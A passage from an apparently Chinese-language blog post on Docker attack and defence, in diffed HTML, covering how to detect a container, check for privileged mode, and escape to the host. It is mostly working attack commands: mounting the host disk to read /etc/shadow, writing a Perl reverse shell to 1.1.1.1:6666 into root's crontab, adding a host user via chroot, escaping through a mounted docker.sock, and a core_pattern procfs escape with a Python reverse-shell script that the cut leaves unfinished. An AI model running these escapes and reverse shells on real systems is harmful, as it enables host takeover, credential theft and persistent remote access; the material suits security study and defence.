class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="n">8bcaf48c88b295de3361fb4eaa8b3be432ae09e480d6c24dfb1e2827dbe8ff6c</span><span class="o">/</span><span class="n">work</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>容器环境输出如下</p>
+<p><img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/5.png"
+	width="2191"
+	height="199"
+	srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/5_hu2d9f11c7948268f8df382c269756de3b_70214_480x0_resize_box_3.png 480w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/5_hu2d9f11c7948268f8df382c269756de3b_70214_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1101"
+		data-flex-basis="2642px"
+	
+></p>
+<p>虚拟机环境输出如下</p>
+<p><img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/6.png"
+	width="816"
+	height="96"
+	srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/6_hub90e4e8e0003c6680ada57e3fdc1ad5b_115053_480x0_resize_box_3.png 480w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/6_hub90e4e8e0003c6680ada57e3fdc1ad5b_115053_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="850"
+		data-flex-basis="2040px"
+	
+></p>
+<h3 id="24查看硬盘信息">2.4.<strong>查看硬盘信息</strong>
+</h3><p><code>fdisk -l  </code>容器输出为空，虚拟机环境存在输出</p>
+<p>容器环境输出如下</p>
+<p><img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/7.png"
+	width="851"
+	height="270"
+	srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/7_hu4d64ed32ccf1e0d7ad3a474aa43ab96c_19639_480x0_resize_box_3.png 480w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/7_hu4d64ed32ccf1e0d7ad3a474aa43ab96c_19639_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="315"
+		data-flex-basis="756px"
+	
+></p>
+<p>虚拟机环境输出如下</p>
+<p><img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/8.png"
+	width="924"
+	height="284"
+	srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/8_hudf6119dae1f210d495dfd44ae9445c3d_363342_480x0_resize_box_3.png 480w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/8_hudf6119dae1f210d495dfd44ae9445c3d_363342_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="325"
+		data-flex-basis="780px"
+	
+></p>
+<h2 id="3容器逃逸">3.容器逃逸
+</h2><h3 id="31特权模式">3.1.特权模式
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">docker</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="o">--</span><span class="n">rm</span><span class="w"> </span><span class="o">--</span><span class="n">privileged</span><span class="o">=</span><span class="kc">true</span><span class="w"> </span><span class="o">-</span><span class="n">it</span><span class="w"> </span><span class="n">alpine</span><span class="w">        </span><span class="c1">//启动一个容器</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="311如何判断容器是否为特权模式启动">3.1.1.如何判断容器是否为特权模式启动？
+</h4><p><a class="link" href="https://wiki.teamssix.com/cloudnative/docker/container-escape-check"  target="_blank" rel="noopener"
+    >https://wiki.teamssix.com/cloudnative/docker/container-escape-check</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">self</span><span class="o">/</span><span class="n">status</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="o">-</span><span class="n">qi</span><span class="w"> </span><span class="s">&#34;0000003fffffffff&#34;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s">&#34;Is privileged mode&#34;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s">&#34;Not privileged mode&#34;</span><span class="w">           </span><span class="c1">//判断容器是否为特权模式启动，也不准</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/9.png"
+	width="2173"
+	height="758"
+	srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/9_huafc74ff1696a07210fe2fe5b3049f58e_316328_480x0_resize_box_3.png 480w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/9_huafc74ff1696a07210fe2fe5b3049f58e_316328_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="286"
+		data-flex-basis="688px"
+	
+></p>
+<p><img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/10.png"
+	width="1447"
+	height="621"
+	srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/10_huf46e82e265c49ab65385191b6041ddb7_145624_480x0_resize_box_3.png 480w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/10_huf46e82e265c49ab65385191b6041ddb7_145624_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="233"
+		data-flex-basis="559px"
+	
+></p>
+<p>不如直接尝试特权操作</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">mount</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="n">proc</span><span class="w"> </span><span class="n">proc</span><span class="w"> </span><span class="o">/</span><span class="n">proc</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s">&#34;Privileged!&#34;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s">&#34;Not privileged&#34;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//尝试特权操作</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ls</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">kmsg</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s">&#34;Privileged!&#34;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s">&#34;Restricted&#34;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/11.png"
+	width="1722"
+	height="300"
+	srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/11_hud366aa10664cf7a396fb28a22e9af5ab_73661_480x0_resize_box_3.png 480w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/11_hud366aa10664cf7a396fb28a22e9af5ab_73661_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="574"
+		data-flex-basis="1377px"
+	
+></p>
+<h4 id="312容器逃逸">3.1.2.容器逃逸
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">fdisk</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w">           </span><span class="c1">//查看挂载设备</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/12.png"
+	width="1762"
+	height="411"
+	srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/12_hu6985ae4e76782cfcb2946b264be93c95_139227_480x0_resize_box_3.png 480w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/12_hu6985ae4e76782cfcb2946b264be93c95_139227_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="428"
+		data-flex-basis="1028px"
+	
+></p>
+<p>在容器内部执行以下命令，将宿主机文件挂载到 /test 目录下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">mkdir</span><span class="w"> </span><span class="o">/</span><span class="n">test</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">mount</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">sda1</span><span class="w"> </span><span class="o">/</span><span class="n">test</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">test</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">shadow</span><span class="w">        </span><span class="c1">//尝试访问宿主机 shadow 文件，可以看到正常访问</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/13.png"
+	width="1877"
+	height="647"
+	srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/13_hu5cc2a36842a0811b77698f4ea8dbb327_245936_480x0_resize_box_3.png 480w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/13_hu5cc2a36842a0811b77698f4ea8dbb327_245936_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="290"
+		data-flex-basis="696px"
+	
+></p>
+<p><strong>后渗透利用</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//在计划任务中写入反弹shell</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">echo</span><span class="w"> </span><span class="n">$</span><span class="err">&#39;</span><span class="o">*/</span><span class="n">1</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">perl</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="err">\&#39;</span><span class="n">use</span><span class="w"> </span><span class="n">Socket</span><span class="p">;</span><span class="n">$i</span><span class="o">=</span><span class="s">&#34;1.1.1.1&#34;</span><span class="p">;</span><span class="n">$p</span><span class="o">=</span><span class="n">6666</span><span class="p">;</span><span class="n">socket</span><span class="p">(</span><span class="n">S</span><span class="p">,</span><span class="n">PF_INET</span><span class="p">,</span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="n">getprotobyname</span><span class="p">(</span><span class="s">&#34;tcp&#34;</span><span class="p">));</span><span class="k">if</span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">S</span><span class="p">,</span><span class="n">sockaddr_in</span><span class="p">(</span><span class="n">$p</span><span class="p">,</span><span class="n">inet_aton</span><span class="p">(</span><span class="n">$i</span><span class="p">)))){</span><span class="n">open</span><span class="p">(</span><span class="n">STDIN</span><span class="p">,</span><span class="s">&#34;&gt;&amp;S&#34;</span><span class="p">);</span><span class="n">open</span><span class="p">(</span><span class="n">STDOUT</span><span class="p">,</span><span class="s">&#34;&gt;&amp;S&#34;</span><span class="p">);</span><span class="n">open</span><span class="p">(</span><span class="n">STDERR</span><span class="p">,</span><span class="s">&#34;&gt;&amp;S&#34;</span><span class="p">);</span><span class="n">exec</span><span class="p">(</span><span class="s">&#34;/bin/sh -i&#34;</span><span class="p">);};</span><span class="err">\&#39;&#39;</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">test</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">cron</span><span class="o">/</span><span class="n">crontabs</span><span class="o">/</span><span class="n">root</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//创建用户登录</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mount</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">sda1</span><span class="w"> </span><span class="o">/</span><span class="n">mnt</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">chroot</span><span class="w"> </span><span class="o">/</span><span class="n">mnt</span><span class="w"> </span><span class="n">adduser</span><span class="w"> </span><span class="n">john</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="32危险挂载">3.2.危险挂载
+</h3><h4 id="321挂载-docker-socket-逃逸">3.2.1.挂载 Docker Socket 逃逸
+</h4><p><a class="link" href="https://wiki.teamssix.com/CloudNative/Docker/docker-socket-escape.html"  target="_blank" rel="noopener"
+    >https://wiki.teamssix.com/CloudNative/Docker/docker-socket-escape.html</a></p>
+<p>Docker Socket 用来与守护进程通信即查询信息或者下发命令。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//环境准备</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">docker</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="o">-</span><span class="n">itd</span><span class="w"> </span><span class="o">--</span><span class="n">name</span><span class="w"> </span><span class="n">with_docker_sock</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">docker</span><span class="p">.</span><span class="na">sock</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">docker</span><span class="p">.</span><span class="na">sock</span><span class="w"> </span><span class="n">ubuntu</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">docker</span><span class="w"> </span><span class="n">exec</span><span class="w"> </span><span class="o">-</span><span class="n">it</span><span class="w"> </span><span class="n">with_docker_sock</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="w">          </span><span class="c1">//进入镜像</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果存在docker.sock这个文件，说明漏洞可能存在</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">lah</span><span class="w"> </span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">docker</span><span class="p">.</span><span class="na">sock</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/14.png"
+	width="1295"
+	height="247"
+	srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/14_hu3670548f970e7304c67ffe92a87f422f_90590_480x0_resize_box_3.png 480w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/14_hu3670548f970e7304c67ffe92a87f422f_90590_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="524"
+		data-flex-basis="1258px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">apt</span><span class="o">-</span><span class="n">get</span><span class="w"> </span><span class="n">update</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">apt</span><span class="o">-</span><span class="n">get</span><span class="w"> </span><span class="n">install</span><span class="w"> </span><span class="n">curl</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">curl</span><span class="w"> </span><span class="o">-</span><span class="n">fsSL</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="c1">//get.docker.com | sed &#39;s|https://download.docker.com|https://mirrors.aliyun.com/docker-ce|g&#39; | sh</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">     
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">docker</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="o">-</span><span class="n">it</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="o">/</span><span class="p">:</span><span class="o">/</span><span class="n">host</span><span class="w"> </span><span class="n">ubuntu</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">chroot</span><span class="w"> </span><span class="o">/</span><span class="n">host</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/15.png"
+	width="2237"
+	height="959"
+	srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/15_hu67068fdd18900d14a36c7cbb2895082a_448177_480x0_resize_box_3.png 480w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/15_hu67068fdd18900d14a36c7cbb2895082a_448177_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="233"
+		data-flex-basis="559px"
+	
+></p>
+<h4 id="322挂载宿主机-procfs-逃逸">3.2.2.挂载宿主机 procfs 逃逸
+</h4><p><a class="link" href="https://wiki.teamssix.com/CloudNative/Docker/docker-procfs-escape.html"  target="_blank" rel="noopener"
+    >https://wiki.teamssix.com/CloudNative/Docker/docker-procfs-escape.html</a></p>
+<p>procfs是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件。因此，将宿主机的procfs挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用root权限，且没有开启User Namespace时。</p>
+<p>Docker默认情况下不会为容器开启 User Namespace</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//创建一个容器并挂载 /proc 目录</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">docker</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="o">-</span><span class="n">it</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">kernel</span><span class="o">/</span><span class="n">core_pattern</span><span class="p">:</span><span class="o">/</span><span class="n">host</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">kernel</span><span class="o">/</span><span class="n">core_pattern</span><span class="w"> </span><span class="n">ubuntu</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//如果找到两个 core_pattern 文件，那可能就是挂载了宿主机的 procfs</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="n">name</span><span class="w"> </span><span class="n">core_pattern</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/16.png"
+	width="1668"
+	height="287"
+	srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/16_hu2a6b46d6c6d1d7f6dc6cbbd438b0bbb1_93052_480x0_resize_box_3.png 480w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/16_hu2a6b46d6c6d1d7f6dc6cbbd438b0bbb1_93052_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="581"
+		data-flex-basis="1394px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//找到当前容器在宿主机下的绝对路径</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">mounts</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xargs</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="sc">&#39;,&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">n</span><span class="w"> </span><span class="n">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="n">workdir</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="n">b6dd750b0dc302208909571f9caa6be7a16129271f837db5d781f3fbabb9b9f3</span><span class="o">/</span><span class="n">merged</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/17.png"
+	width="1859"
+	height="157"
+	srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/17_hu630397412b5b9f295850602d63b585c0_72315_480x0_resize_box_3.png 480w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/17_hu630397412b5b9f295850602d63b585c0_72315_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1184"
+		data-flex-basis="2841px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//写入文件</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cat</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="p">.</span><span class="na">rce</span><span class="p">.</span><span class="na">py</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="err">&#39;</span><span class="n">EOF</span><span class="err">&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="o">!/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">python3</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">os</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">pty</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lhost</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;1.1.1.1&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lport</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">6666</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">socket</span><span class="p">.</span><span class="na">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="na">AF_INET</span><span class="p">,</span><span class="w"> </span><span class="n">socket</span><span class="p">.</span><span class="na">SOCK_STREAM</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">s</span><span class="p">.</span><span class="na">connect</span><span class="p">((</span><span class="n">lhost</span><span class="p">,</span><span class="w"> </span><span class="n">lport</span><span class="p">))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">os</span><span class="p">.</span><span class="na">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="na">fileno</span><span class="p">(),</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w">
